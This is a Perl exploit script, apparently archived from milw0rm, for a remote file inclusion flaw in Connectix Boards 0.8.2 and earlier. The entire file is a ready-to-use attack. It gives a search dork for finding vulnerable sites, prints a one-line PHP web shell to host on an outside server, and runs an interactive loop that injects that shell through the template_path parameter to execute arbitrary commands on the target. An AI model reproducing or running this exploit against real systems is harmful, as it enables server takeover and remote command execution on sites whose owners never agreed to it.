@@ -1,0 +1,57 @@
+#!/usr/bin/perl
+#
+# Author : HouSSaMix From H-T Team
+# Script : Connectix Boards (  Tested in last version 0.8.2 & 0.8.1 ) 
+# Bug : Remote File Inclusion
+# Vulnerable Code : <?php include ($template_path.'menu_links.php'); ?>
+# Dork : powered by connectix boards
+# Risk : High 
+# Download : http://www.connectix-boards.org/
+# Exploit: http://Target.il/[path]/templates/Official/part_userprofile.php?template_path=[Shell]
+
+use LWP::Simple;
+
+print "-------------------------[ H-T Team ]--------------------------\n";
+print "-                                                             -\n";
+print "-         Connectix Boards <=0.8.2  - Remote File Inclusion   -\n";
+print "-                                                             -\n";
+print "---------------------------------------------------------------\n";
+print "-       H-T Team [ HouSSaMix + ToXiC350 ] from MoroCCo        -\n";
+print "-       Bug found and Coded By HouSSaMix & ToXiC350           -\n";
+print "---------------------------------------------------------------\n\n";
+
+my $morocco,$path,$shell,$conexiune,$cmd,$data ;
+
+
+if ((!$ARGV[0]) || (!$ARGV[1])) { &usage;exit(0);}
+
+$path = $ARGV[0];
+chomp($path);
+$shell = $ARGV[1];
+chomp($shell);
+
+$path = $path."/templates/Official/part_mps.php";
+
+
+sub usage(){
+       print "=> Usage: perl $0 Target/path http://site.com/cmd.txt\n";
+       print "=> Ex   : perl $0 http://site.com/forum http://site.com/cmd.txt\n";
+	   print "Code of file cmd.txt : \n";
+       print '<?php ob_clean();ini_set("max_execution_time",0);passthru($_GET["cmd"]);die;?>';
+	   print "   \n";
+          }
+
+while ()
+{
+print "Enter your command :~\$ ";
+chomp($cmd=<STDIN>);
+if ($cmd eq "exit") { exit(0);}
+
+$morocco = $path."?template_path=".$shell."?&cmd=".$cmd;
+if ($cmd eq "")
+ { print "Enter your command !\n"; }
+else
+ { $data=get($morocco); print $data ; }
+}
+
+# milw0rm.com [2008-01-30]
